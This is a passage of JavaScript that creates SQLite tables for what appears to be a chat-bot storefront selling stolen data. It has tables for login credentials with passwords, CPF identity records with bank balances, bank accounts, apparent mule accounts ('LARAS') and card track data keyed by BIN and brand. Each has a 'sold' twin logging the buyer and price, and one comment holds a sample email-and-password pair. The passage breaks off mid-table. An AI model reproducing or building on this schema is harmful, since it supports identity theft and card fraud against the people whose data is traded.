    //     //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    //     DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PREPARAR_PACOTE
    // (
    // CONTATO VARCHAR(32) DEFAULT '0',
    // QUANTIDADE VARCHAR(32) DEFAULT '0',
    // VALOR VARCHAR(32) DEFAULT '0',
    // TIPO VARCHAR(32) DEFAULT '0',
    // PROCESSADO VARCHAR(32) DEFAULT '0',
    // DATA_INSERIDO_MS VARCHAR(32) DEFAULT '0'
    // )`
    //     ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PREPARAR_PACOTEV3
(
CONTATO VARCHAR(32) DEFAULT '0',
QUANTIDADE VARCHAR(32) DEFAULT '0',
VALOR VARCHAR(32) DEFAULT '0',
COLUNA VARCHAR(32) DEFAULT '0',
PARAMETRO VARCHAR(32) DEFAULT '0',
TIPOCC VARCHAR(32) DEFAULT '0',
PROCESSADO VARCHAR(32) DEFAULT '0',
DATA_INSERIDO_MS VARCHAR(32) DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃

    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒

    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CONSULTAVEIS
(
BANCO VARCHAR(32) NOT NULL DEFAULT '0',
SALDO VARCHAR(32) NOT NULL DEFAULT '0',
PRECO VARCHAR(32) NOT NULL DEFAULT '0',
INFORMACOES_ADICIONAIS VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CONSULTAVEIS_VENDIDAS
(
BANCO VARCHAR(32) NOT NULL DEFAULT '0',
SALDO VARCHAR(32) NOT NULL DEFAULT '0',
PRECO VARCHAR(32) NOT NULL DEFAULT '0',
INFORMACOES_ADICIONAIS VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO_COMPRADOR VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃


    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒

    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CONSULTADAS
(
BANCO VARCHAR(32) NOT NULL DEFAULT '0',
BIN VARCHAR(32) NOT NULL DEFAULT '0',
SALDO VARCHAR(32) NOT NULL DEFAULT '0',
PRECO VARCHAR(32) NOT NULL DEFAULT '0',
INFORMACOES_ADICIONAIS VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    try {
        DataBase_Better.prepare(`ALTER TABLE CONSULTADAS ADD BIN tada_type NOT NULL DEFAULT 0;`).run()
    } catch (error) {
    }
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CONSULTADAS_VENDIDAS
(
BANCO VARCHAR(32) NOT NULL DEFAULT '0',
BIN VARCHAR(32) NOT NULL DEFAULT '0',
SALDO VARCHAR(32) NOT NULL DEFAULT '0',
PRECO VARCHAR(32) NOT NULL DEFAULT '0',
INFORMACOES_ADICIONAIS VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO_COMPRADOR VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    try {
        DataBase_Better.prepare(`ALTER TABLE CONSULTADAS_VENDIDAS ADD BIN tada_type NOT NULL DEFAULT 0;`).run()
    } catch (error) {
    }
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃


    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒

    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS LOGINS
(
SERVICO VARCHAR(32) NOT NULL DEFAULT '0',
EMAIL VARCHAR(32) NOT NULL DEFAULT '0',
SENHA VARCHAR(32) NOT NULL DEFAULT '0',
NOME VARCHAR(32) NOT NULL DEFAULT '0',
CPF VARCHAR(32) NOT NULL DEFAULT '0',
USER VARCHAR(32) NOT NULL DEFAULT '0',
TELEFONE VARCHAR(32) NOT NULL DEFAULT '0',
ESTADO VARCHAR(32) NOT NULL DEFAULT '0',
CIDADE VARCHAR(32) NOT NULL DEFAULT '0',
ADICIONAIS VARCHAR(32) NOT NULL DEFAULT '0',
PRECO VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS LOGINS_VENDIDOS
(
SERVICO VARCHAR(32) NOT NULL DEFAULT '0',
EMAIL VARCHAR(32) NOT NULL DEFAULT '0',
SENHA VARCHAR(32) NOT NULL DEFAULT '0',
NOME VARCHAR(32) NOT NULL DEFAULT '0',
CPF VARCHAR(32) NOT NULL DEFAULT '0',
USER VARCHAR(32) NOT NULL DEFAULT '0',
TELEFONE VARCHAR(32) NOT NULL DEFAULT '0',
ESTADO VARCHAR(32) NOT NULL DEFAULT '0',
CIDADE VARCHAR(32) NOT NULL DEFAULT '0',
ADICIONAIS VARCHAR(32) NOT NULL DEFAULT '0',
PRECO VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO_COMPRADOR VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃


    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒

    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS LARAS
(
BANCO VARCHAR(32) NOT NULL DEFAULT '0',
NOME VARCHAR(32) NOT NULL DEFAULT '0',
PRECO VARCHAR(32) NOT NULL DEFAULT '0',
ADICIONAIS VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS LARAS_VENDIDAS
(
BANCO VARCHAR(32) NOT NULL DEFAULT '0',
NOME VARCHAR(32) NOT NULL DEFAULT '0',
PRECO VARCHAR(32) NOT NULL DEFAULT '0',
ADICIONAIS VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO_COMPRADOR VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃


    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒

    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    //addcpf===CPF===NOME===ANO_NASC===TIPO===SALDO===NOME_CELULAR===NUMERO_CELULAR
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CPF
(
CPF VARCHAR(32) NOT NULL DEFAULT '0',
NOME VARCHAR(32) NOT NULL DEFAULT '0',
ANO_NASC VARCHAR(32) NOT NULL DEFAULT '0',
TIPO VARCHAR(32) NOT NULL DEFAULT '0',
SALDO VARCHAR(32) NOT NULL DEFAULT '0',
NOME_CELULAR VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO_CELULAR VARCHAR(32) NOT NULL DEFAULT '0',
QUATRO_DIGITOS VARCHAR(32) NOT NULL DEFAULT '0',
CADASTRADO VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CPF_VENDIDOS
(
CPF VARCHAR(32) NOT NULL DEFAULT '0',
NOME VARCHAR(32) NOT NULL DEFAULT '0',
ANO_NASC VARCHAR(32) NOT NULL DEFAULT '0',
TIPO VARCHAR(32) NOT NULL DEFAULT '0',
SALDO VARCHAR(32) NOT NULL DEFAULT '0',
NOME_CELULAR VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO_CELULAR VARCHAR(32) NOT NULL DEFAULT '0',
QUATRO_DIGITOS VARCHAR(32) NOT NULL DEFAULT '0',
CADASTRADO VARCHAR(32) NOT NULL DEFAULT '0',
PUXADA VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO_COMPRADOR VARCHAR(32) NOT NULL DEFAULT '0',
PRECO_COMPRADO VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    //addcpfextra===CPF===CADASTRADO===DATA
    //addcpfextra===12345678===1 ou 0===20/04 ou 30/04
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CPF_EXTRAORDINARIO
(
CPF VARCHAR(32) NOT NULL DEFAULT '0',
TIPO VARCHAR(32) NOT NULL DEFAULT '0',
CADASTRADO VARCHAR(32) NOT NULL DEFAULT '0',
DATA VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CPF_EXTRAORDINARIO_VENDIDOS
(
CPF VARCHAR(32) NOT NULL DEFAULT '0',
CADASTRADO VARCHAR(32) NOT NULL DEFAULT '0',
DATA VARCHAR(32) NOT NULL DEFAULT '0',
PUXADA VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO_COMPRADOR VARCHAR(32) NOT NULL DEFAULT '0',
VALOR_PACOTE VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE_PACOTE VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PACOTES_CPF_EXTRAORDINARIO
(
TIPO VARCHAR(32) NOT NULL DEFAULT '0',
CADASTRADO VARCHAR(32) NOT NULL DEFAULT '0',
DATA VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PACOTES_CPF_VENDIDOS
(
TIPO VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE VARCHAR(32),
VALOR VARCHAR(32),
COMPRADOR VARCHAR(32),
DATA_INSERIDO_MS VARCHAR(32)
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃


    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒

    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    //addemailterra===EMAIL===SENHA
    //addemailterra===narutovisk@terra.com===sasuke123
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS EMAIL
(
EMAIL VARCHAR(32) NOT NULL DEFAULT '0',
SENHA VARCHAR(32) NOT NULL DEFAULT '0',
PROVEDOR VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS EMAIL_VENDIDOS
(
EMAIL VARCHAR(32) NOT NULL DEFAULT '0',
SENHA VARCHAR(32) NOT NULL DEFAULT '0',
PROVEDOR VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO_COMPRADOR VARCHAR(32) NOT NULL DEFAULT '0',
VALOR_PACOTE VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE_PACOTE VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PACOTES_EMAIL
(
PROVEDOR VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE VARCHAR(32) NOT NULL DEFAULT '0',
VALOR VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PACOTES_EMAIL_VENDIDOS
(
PROVEDOR VARCHAR(32) NOT NULL DEFAULT '0',
QUANTIDADE VARCHAR(32),
VALOR VARCHAR(32),
NUMERO_COMPRADOR VARCHAR(32),
DATA_INSERIDO_MS VARCHAR(32)
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃


    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒

    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS TRILHAS
(
BIN  VARCHAR(32) NOT NULL DEFAULT '0',
CPF  VARCHAR(32) NOT NULL DEFAULT '0',
LEVEL  VARCHAR(32) NOT NULL DEFAULT '0',
PRECO  VARCHAR(32) NOT NULL DEFAULT '0',
TUDO_DA_TRILHA  VARCHAR(32) NOT NULL DEFAULT '0',
BANDEIRA  VARCHAR(32) NOT NULL DEFAULT '0',
TIPO  VARCHAR(32) NOT NULL DEFAULT '0',
NIVEL  VARCHAR(32) NOT NULL DEFAULT '0',
BANCO  VARCHAR(32) NOT NULL DEFAULT '0',
PAIS  VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO  VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS TRILHAS_VENDIDAS
(
BIN  VARCHAR(32) NOT NULL DEFAULT '0',
CPF  VARCHAR(32) NOT NULL DEFAULT '0',
LEVEL  VARCHAR(32) NOT NULL DEFAULT '0',
PRECO  VARCHAR(32) NOT NULL DEFAULT '0',
TUDO_DA_TRILHA  VARCHAR(32) NOT NULL DEFAULT '0',
BANDEIRA  VARCHAR(32) NOT NULL DEFAULT '0',
TIPO  VARCHAR(32) NOT NULL DEFAULT '0',
NIVEL  VARCHAR(32) NOT NULL DEFAULT '0',
BANCO  VARCHAR(32) NOT NULL DEFAULT '0',
PAIS  VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO_COMPRADOR VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃


    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒
    //▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░ 「✦」 ░▒

    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS INTERACOES
(
STATUS VARCHAR(32) NOT NULL DEFAULT '0',
MENSAGEM_ID_LISTA VARCHAR(32) NOT NULL DEFAULT '0',
MENSAGEM_TIPO VARCHAR(32) NOT NULL DEFAULT '0',
MENSAGEM_FROM VARCHAR(32) NOT NULL DEFAULT '0',
MENSAGEM_NOME VARCHAR(32) NOT NULL DEFAULT '0',
MENSAGEM_TEXTO VARCHAR(32) NOT NULL DEFAULT '0',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0'
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS GERENTES
(
ID_CONTATO VARCHAR(32) NOT NULL DEFAULT '0',
PRIMARY KEY(ID_CONTATO)
)`
    ).run()
    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS CONTATOS
(
ID_CONTATO VARCHAR(32) NOT NULL DEFAULT '0',
NOME VARCHAR(32) NOT NULL DEFAULT '0',
STATUS VARCHAR(32) NOT NULL DEFAULT '0',
ID_BOTAO VARCHAR(32) NOT NULL DEFAULT '0',
NUMERO_INDICADOR VARCHAR(32) NOT NULL DEFAULT '0',
BONUS_INDICACAO VARCHAR(32) NOT NULL DEFAULT '0',
SALDO_INDICACAO VARCHAR(32) NOT NULL DEFAULT '0',
CHAVEPIX_INDICADO VARCHAR(32) NOT NULL DEFAULT '0',
PERCENTUAL_ADICIONAL_ASSOCIADO VARCHAR(32) NOT NULL DEFAULT '0',
SALDO VARCHAR(32) NOT NULL DEFAULT '0',
RECEBEU_SPAM VARCHAR(32) NOT NULL DEFAULT '0',
BLOQUEADO VARCHAR(32) NOT NULL DEFAULT '0',
REEMBOLSADO VARCHAR(32) NOT NULL DEFAULT '0',
TIPOMENU_ATUAL VARCHAR(32) NOT NULL DEFAULT 'a',
DATA_MS_INSERIDO VARCHAR(32) NOT NULL DEFAULT '0',

PRIMARY KEY(ID_CONTATO)
)`
    ).run()
    /*
    REEMBOLSADO = 0 => Nada a fazer, não pode reembolsar
    REEMBOLSADO = 1 => Permite reembolsar, caso reembolso esteja habilitado
    REEMBOLSADO = 2 => Ja reembolsou, não pode mais
    */

    try {
        DataBase_Better.prepare(`ALTER TABLE CONTATOS ADD REEMBOLSADO tada_type NOT NULL DEFAULT 0;`).run()
    } catch (error) {
    }
    try {
        DataBase_Better.prepare(`ALTER TABLE CONTATOS ADD EMAIL_RECEBEDOR tada_type NOT NULL DEFAULT 1;`).run()
    } catch (error) {
    }
    try {
        DataBase_Better.prepare(`ALTER TABLE CONTATOS ADD NOME tada_type NOT NULL DEFAULT 0;`).run()
    } catch (error) {
    }
    try {
        DataBase_Better.prepare(`ALTER TABLE CONTATOS ADD BLOQUEADO tada_type NOT NULL DEFAULT 0;`).run()
    } catch (error) {
    }
    try {
        DataBase_Better.prepare(`ALTER TABLE CONTATOS ADD ASSOCIADO tada_type NOT NULL DEFAULT 0;`).run()
    } catch (error) {
    }
    try {
        DataBase_Better.prepare(`ALTER TABLE CONTATOS ADD SALDO_INDICACAO tada_type NOT NULL DEFAULT 0;`).run()
    } catch (error) {
    }
    try {
        DataBase_Better.prepare(`ALTER TABLE CONTATOS ADD PERCENTUAL_ADICIONAL_ASSOCIADO tada_type NOT NULL DEFAULT 0;`).run()
    } catch (error) {
    }
    try {
        DataBase_Better.prepare(`ALTER TABLE CONTATOS ADD CHAVEPIX_INDICADO tada_type NOT NULL DEFAULT 0;`).run()
    } catch (error) {
    }
    try {
        DataBase_Better.prepare(`ALTER TABLE CONTATOS ADD TIPOMENU_ATUAL VARCHAR(32) NOT NULL DEFAULT 'a';`).run()
    } catch (error) {
    }

    //▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
    DataBase_Better.prepare(`CREATE TABLE IF NOT EXISTS PAGAMENTOS_ASSOCIADO
(
ID_CONTATO VARCHAR(32) NOT NULL DEFAULT '0',
